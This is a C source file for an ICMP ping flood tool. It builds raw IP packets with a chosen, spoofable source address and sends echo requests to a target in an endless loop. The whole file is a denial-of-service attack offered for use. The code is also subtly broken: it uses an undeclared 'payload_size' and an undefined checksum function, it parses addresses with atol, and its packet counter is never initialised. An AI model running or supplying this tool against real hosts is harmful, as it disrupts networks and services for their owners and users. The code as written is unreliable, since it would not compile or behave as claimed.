/**
 * ICMP ping flood
 *
 * Written By Josh Harshman
 * All Rights Reserved 12.10.2013
 **/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>

void usage( void );
//= = = = = = = = = = = = = = = = = = = = = = = = = = =

void usage( void ) {
  printf("Usage:\n");
  printf(" -s source address\n");
  printf(" -d destination address\n");
  printf(" -p payload size\n");
  exit (8);

}
int main(int argc, char *argv[]) {

  unsigned long dest;
  unsigned long source;
  int load_size, sent, sent_size;

  //argument parsing
  if(argc < 3)
    usage();

  int i;
  for(i = 0; i < argc; i ++) {
    if(strncmp(argv[i], "-s", 2) == 0) {
      source = atol(argv[i+1]);
    }
    if(strncmp(argv[i], "-d", 2) == 0) {
      dest = atol(argv[i+1]);
    }
    if(strncmp(argv[i], "-p", 2) == 0) {
      load_size = atoi(argv[i+1]);
    }
  }
  //end arg parsing

  //establish raw socket
  int lsocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  if(lsocket < 0) {
    puts("Error, could not create socket");
    return 0;
  }

  int on = 1;

  //provide ip header information
  if( setsockopt (lsocket, IPPROTO_IP, IP_HDRINCL, (const char *)&on, sizeof(on)) < 0 ) {
    perror("setsockopt error"); //prints error message to stderr
    return 0;
  }

  //allow packets to send datagrams
  if( setsockopt(lsocket, SOL_SOCKET, SO_BROADCAST, (const char *)&on, sizeof(on)) < 0 ) {
    perror("setsockopt error");
    return 0;
  }

  //calc packet size
  int packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size;
  char *packet = (char *) malloc(packet_size);

  //no need to test for out of memory error on modern system

  //ip header
  struct iphdr *ip = (struct iphdr *) packet;
  struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));

  //zero out the packet buffer
  memset(packet, 0, packet_size);

  //set member variables
  ip->version = 4;
  ip->ihl = 5;
  ip->tos = 0;
  ip->tot_len = htons(packet_size);
  ip->id = rand();
  ip->frag_off = 0;
  ip->ttl = 225;
  ip->protocol = IPPROTO_ICMP;
  ip->saddr = source;
  ip->daddr = dest;

  icmp->type = ICMP_ECHO;
  icmp->code = 0;
  icmp->un.echo.sequence = rand();
  icmp->un.echo.id = rand();
  icmp->checksum = 0;

  struct sockaddr_in servaddr;
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = dest;
  memset(&servaddr.sin_zero, 0, sizeof(servaddr.sin_zero));

  puts("Now flooding target");

  while (1) {

    memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
    icmp->checksum = 0;
    icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);

    if( (sent_size = sendto(lsocket, packet, packet_size, 0, (struct sockaddr *) &servaddr, sizeof(servaddr))) < 1) {
      perror("Packet Send Failed");
      break;
    }

    ++sent;
    printf("%d packets sent\r", sent);
    fflush(stdout);

    usleep(10000);

  }

  free(packet);
  close(lsocket);

  return 0;

}
